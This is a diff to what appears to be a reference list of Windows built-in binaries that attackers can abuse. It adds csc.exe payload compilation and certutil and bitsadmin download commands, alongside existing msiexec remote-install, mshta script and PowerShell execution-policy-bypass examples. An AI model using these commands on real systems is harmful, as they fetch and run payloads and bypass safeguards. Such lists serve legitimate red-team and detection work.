@@ -34,6 +34,11 @@ https://github.com/hfiref0x/UACME
   - Description: The control panel feature within Windows supports the execution of arbitrary DLLs as demonstrated in the shadowbrokers release. (https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/)
   - Example: control.exe payload.dll
 
+- csc.exe
+  - Description: The .NET compiler can be used to compile a c# payload locally that can then be executed.
+  - Example: C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
+  - Example payload.cs: public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}}
+  
 - cscript.exe/wscript.exe
   - Description: Windows script engines that support both VBS and JScript execution. CScript is the console version, WScript is the Window version. Neither version supports scripts being supplied on the command line, instead a file must be created containing the script or a funky bat file wrapper.
   - Example: cscript.exe test.vbs (where test.vbs contains WScript.Echo "test")
@@ -42,17 +47,17 @@ https://github.com/hfiref0x/UACME
   - Description: Forfiles supports the ability to execute commands and seems to be equivalent to cmd.
   - Example: forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
 
-- msiexec
+- msiexec.exe
   - Description - The Windows installer typically used to install new software or patches. It be used to download and execute a remote payload.
   - Example: msiexec /i http://server/package.msi
 
-- mshta
+- mshta.exe
   - Description: MSHTA can be used to execute HTA files (containing scripts) or directly execute VBScript/JScript from the command line.
   - Example: mshta bad.hta
   - Example: mshta vbscript:Execute("MsgBox(""amessage"",64,""atitle"")(window.close)")
   - Example: mshta javascript:alert('test');
 
-- powershell
+- powershell.exe
   - Description: The most well known and most useful attacker utility. Powershell can be operated in console mode, with commands provided on the command line or through passing a ps1 file containing commands.
   - Example: powershell -c calc
   - Example: powershell -exec bypass -File test.ps1
@@ -76,3 +81,8 @@ https://github.com/hfiref0x/UACME
 - certutil.exe
   - Description: Allows you to download a payload.
   - Example: certutil -ping [URL]
+  - Example: certutil -urlcache -split -f [URL] [output-file]
+  
+- bitsadmin.exe
+  - Description: Allows you to download a payload.
+  - Example: bitsadmin /transfer [job-name] /download /priority normal [URL-to-payload] [output-path]
